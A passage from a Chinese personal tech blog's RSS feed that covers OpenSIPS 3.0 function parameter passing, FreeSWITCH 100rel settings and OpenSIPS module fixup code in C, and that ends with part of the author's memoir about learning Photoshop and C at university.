&lt;blockquote&gt;
&lt;p&gt;To hate is to study, to study is to understand, to understand is to appreciate, to appreciate is to love. So maybe I&amp;rsquo;ll end up loving your theory.  &amp;ndash; Wheeler&lt;/p&gt;</description>
    </item>
    <item>
      <title>模块传参的重构</title>
      <link>https://wdd.js.org/opensips/ch8/fork/</link>
      <pubDate>Tue, 27 Apr 2021 13:36:22 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch8/fork/</guid>
      <description>&lt;p&gt;写过opensips脚本的同学，往往对函数的传参感到困惑。&lt;/p&gt;
&lt;p&gt;例如：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ds_select_dst()可以接受整数或者值为正数的变量作为第一个参数，但是nat_uac_test()的第一个参数就只能是整数，而不能是变量&lt;/li&gt;
&lt;li&gt;为什么rl_check()可以接受格式化的字符串，而save()只能接受字符串。&lt;/li&gt;
&lt;li&gt;为什么&lt;code&gt;ds_select_dst(&amp;quot;1&amp;quot;, &amp;quot;4&amp;quot;)&lt;/code&gt; 作为整数也要加上双引号？&lt;/li&gt;
&lt;li&gt;为什么变量要加上双引号？ &lt;code&gt;ds_select_dst(&amp;quot;$var(aa)&amp;quot;, &amp;quot;4&amp;quot;)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;为什么&lt;code&gt;t_on_branch(&amp;quot;1&amp;quot;)&lt;/code&gt;路由的钩子要加上双引号？&lt;/li&gt;
&lt;li&gt;为什么&lt;code&gt;route(go_to_something);&lt;/code&gt;这里又不需要加上引号？&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ds_select_dst&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;0&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;aa&lt;span style=&#34;color:#f92672&#34;&gt;)=&lt;/span&gt;1;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ds_select_dst&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(aa)&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;0&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rl_check&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;gw_&lt;/span&gt;$ru&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(limit)&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;#格式化的gw_$ru&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;save&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;location&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;#单纯的字符串作为参数&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;从3.0开始，传参可以更加自然。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;整数可以直接传参，不用加双引号&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;do_something&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;1, 1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;输入或者输出的$var(), 不用加双引号，加了反而会报错&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;do_something&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;, $var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;b&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;格式化字符串，需要加双引号&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;do_something&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;1, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(bb)_&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(b)&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://blog.opensips.org/2019/11/05/the-module-function-interface-rework-in-opensips-3-0/&#34;&gt;https://blog.opensips.org/2019/11/05/the-module-function-interface-rework-in-opensips-3-0/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.opensips.org/Documentation/Script-Syntax-3-0#&#34;&gt;https://www.opensips.org/Documentation/Script-Syntax-3-0#&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>sbc 100rel</title>
      <link>https://wdd.js.org/opensips/ch9/100-rel/</link>
      <pubDate>Mon, 26 Apr 2021 09:56:53 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch9/100-rel/</guid>
      <description>&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/ch9/100-rel/2022-12-03-20-32-37.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;./sbc_100rel.pdf&#34;&gt;sbc_100rel.pdf&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在fs中配置：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;enable-100rel 设置为true&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;➜  fs-conf ack 100rel
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sip_profiles/internal.xml
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;112:        There are known issues &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;asserts and segfaults&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; when 100rel is enabled.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;113:        It is not recommended to enable 100rel at this time.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;115:    &amp;lt;!--&amp;lt;param name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;enable-100rel&amp;#34;&lt;/span&gt; value&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;/&amp;gt;--&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sip_profiles/external-ipv6.xml
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;36:    &amp;lt;!--&amp;lt;param name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;enable-100rel&amp;#34;&lt;/span&gt; value&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;/&amp;gt;--&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sip_profiles/internal-ipv6.xml
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;27:    &amp;lt;!--&amp;lt;param name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;enable-100rel&amp;#34;&lt;/span&gt; value&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;false&amp;#34;&lt;/span&gt;/&amp;gt;--&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sip_profiles/external.xml
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;36:    &amp;lt;!--&amp;lt;param name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;enable-100rel&amp;#34;&lt;/span&gt; value&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;/&amp;gt;--&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id=&#34;heading&#34;&gt;&lt;/h5&gt;
&lt;h1 id=&#34;enable-100rel&#34;&gt;enable-100rel&lt;/h1&gt;
&lt;p&gt;This enable support for 100rel (100% reliability - PRACK message as defined in&lt;a href=&#34;http://tools.ietf.org/html/rfc3262&#34;&gt;RFC3262&lt;/a&gt;) This fixes a problem with SIP where provisional messages like &amp;ldquo;180 Ringing&amp;rdquo; are not ACK&amp;rsquo;d and therefore could be dropped over a poor connection without retransmission. &lt;em&gt;2009-07-08:&lt;/em&gt; Enabling this may cause FreeSWITCH to crash, see&lt;a href=&#34;http://jira.freeswitch.org/browse/FSCORE-392&#34;&gt;FSCORE-392&lt;/a&gt;.&lt;!-- raw HTML omitted --&gt;&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>ch4-3 $var() 类型的传参</title>
      <link>https://wdd.js.org/opensips/module-dev/l4-3/</link>
      <pubDate>Sun, 25 Apr 2021 09:10:28 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/module-dev/l4-3/</guid>
      <description>&lt;p&gt;假如一个模块暴露了一个函数，叫做do_something(), 仅支持传递一个参数。这个函数在c文件中对应w_do_something()&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;// 在opensips.cfg文件中
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;route&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	do_something&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;abc&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;static int w_do_something&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;struct sip_msg* msg, char* str1&lt;span style=&#34;color:#f92672&#34;&gt;){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 	// 在c文件中，我们打印str1的值，这个字符串就是abc
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;// 在opensips.cfg文件中
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;route&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	$var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;num&lt;span style=&#34;color:#f92672&#34;&gt;)=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;abc&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	do_something&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(num)&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;static int w_do_something&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;struct sip_msg* msg, char* str1&lt;span style=&#34;color:#f92672&#34;&gt;){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 	// 在c文件中，我们打印str1的值，这个字符串就是$var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;num&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  // 这时候就有问题了，其实我们想获取的是$var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;num&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;的值abc, 而不是字符串$var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;num&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;那怎么获取$var()的传参的值呢？这里就需要用到了函数的fixup_函数。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;static cmd_export_t cmds&lt;span style=&#34;color:#f92672&#34;&gt;[]={&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;find_zone_code&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;cmd_function&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;w_do_something, 2, fixup_do_something, 0, REQUEST_ROUTE&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;0,0,0,0,0,0&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;// 调用fixup_spve， 只有在fixup函数中，对函数的参数执行了fixup, 在真正的执行函数中，才能得到真正的$var&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;的值
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;static int fixup_do_something&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;void** param, int param_no&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    LM_INFO&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fixup_find_zone_code: param: %s  param_no: %d\n&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;char *&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;*param, param_no&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; fixup_spve&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;param&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;static int w_do_something &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;struct sip_msg* msg, char* str1&lt;span style=&#34;color:#f92672&#34;&gt;){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    str zone;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;fixup_get_svalue&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;msg, &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;gparam_p&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;str1, &amp;amp;zone&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; !&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        LM_WARN&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cannot find the phone!\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; -1;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    LM_INFO&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;zone:%s\n&amp;#34;&lt;/span&gt;, zone.s&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; 1;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>我的传记 - 大学篇</title>
      <link>https://wdd.js.org/posts/2021/04/mcgyoz/</link>
      <pubDate>Sat, 24 Apr 2021 21:40:43 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2021/04/mcgyoz/</guid>
      <description>&lt;p&gt;2012年，我从安徽的一个小城市考到上海，前往一个普通的二本院校上大学，学习网络工程。&lt;/p&gt;
&lt;p&gt;在很多人以为，上大学不就是玩吗？其实也基本属实，特别是像我们这种普通的学校。但是我的大学也并没有荒废，这其实也并不是说明我就多优秀。 这其中的原因，说来也是蛮有意思。我打游戏太菜，而且心理素质不好，且又没有坚持不懈的毅力。所以我就早早的放弃了英雄联盟这种游戏。&lt;/p&gt;
&lt;p&gt;一个大学生，一旦放弃了打游戏，其实他就剩余了很多空余的时间。多余的时间能干生么呢？&lt;/p&gt;
&lt;p&gt;选择不多。1. 可以选择谈谈恋爱。但是一来我囊中羞涩，而来也没有什么长得比较漂亮，一见钟情的女生。所以谈恋爱这事就放下了。 剩下的选择便只有一个，学习。&lt;/p&gt;
&lt;p&gt;对了，就是学习。当其他人都选择游戏娱乐的时候，你稍微用点力，就能比很多人优秀。&lt;/p&gt;
&lt;p&gt;下一个问题就是学习。 学习要有兴趣，并且要决定学什么。&lt;/p&gt;
&lt;p&gt;这种时候，我思潮又落入回忆中，似乎忘记的事情，此刻又清晰想起来。&lt;/p&gt;
&lt;p&gt;那是我初三暑假的时候，参加过一次学校组织的计算机免费培训课程，其中培训了很多东西。像五笔打字、制作flash、学习photoshop之类的。上课老师在课堂上说过，培训结束的时候，会选择几个成绩优异的学生，给予几百块的奖励。为了这几百块的奖励，我也不能退缩，我很快记住了五笔词根。然后在课堂上，我在众同学佩服的眼光中，把五笔字根全部背了一遍给老师听。&lt;/p&gt;
&lt;p&gt;学习的内容中，photoshop真实给我打开了一个通往神秘世界的大门，原来电脑还能做这么牛逼的事情。接下来经过我废寝忘食，专心致志，一丝不苟的学习，我已经知道了一些基本的图片制作技巧。利用这个技巧，我做了很多搞笑的图片，just for fun!&lt;/p&gt;
&lt;p&gt;然而直到暑假结束，很多同学心心念念的几百块奖励，讲课老师在也没有提过。&lt;/p&gt;
&lt;p&gt;我想，有了初中的ps经验，况且我对这东西很感兴趣。所以我就从淘宝上换了几十块钱，买了一本很厚的，讲解photoshop的书。按照书中的指导，我对photoshop有了全面系统的学习，然后又跟着实战，学会了很多关于抠图、美容、特效的技术。虽然我学了photoshop，但是感觉上并没有什么用，因为考试又不考photoshop, 所以我只能自己通过制作一些搞笑图片来自娱自乐。&lt;/p&gt;
&lt;p&gt;然而，一旦你学会某个东西，便真的有派上用场的时候。大四快毕业时，很多同学开始搞简历，简历上一般要贴照片的。所以我便成为了班级里远近闻名的修图大师。&lt;/p&gt;
&lt;p&gt;除了photoshop，专业课上可以说的就是学习编程了。当时我c语言学的非常好，授课老师经常在课堂上提我来回答问题。为了避免回答不上来问题，显得很没面子。我经常在上课之前偷偷的就预习上课的内容，并且学习如何解答课后的习题。所以老师的提问我经常可以轻松的回答。老师似乎我觉得我是个可育之才，经常在其他班级上课的时候，也会在课上提我的名字，说：其他班的王xx同学，他这个问题回答的很好。所以一些其他班级的同学，也是知道我的名字的。&lt;/p&gt;
&lt;p&gt;每每到考试之前，我总会收到不少加我QQ好友的申请，然后问我有没有时间，想找我帮他们复习c语言。然后带上饮料，约我到图书馆，当面传道授业解惑。我还记得一个比较奇葩的老师，给同学布置作业，要求实现某某功能，至少要求要有三千行代码，然后该同学东拼西凑，也只凑够了快一千行，然后找我帮忙。&lt;/p&gt;
&lt;p&gt;可以参考：&lt;/p&gt;
&lt;p&gt;大二的暑假，我们搬了校区。从远离市区的新校区，搬到了离市区比较近的老校区。&lt;/p&gt;
&lt;p&gt;快放假了，有不少的同学决定暑假留校，然后找点工作，赚点零花钱。&lt;/p&gt;
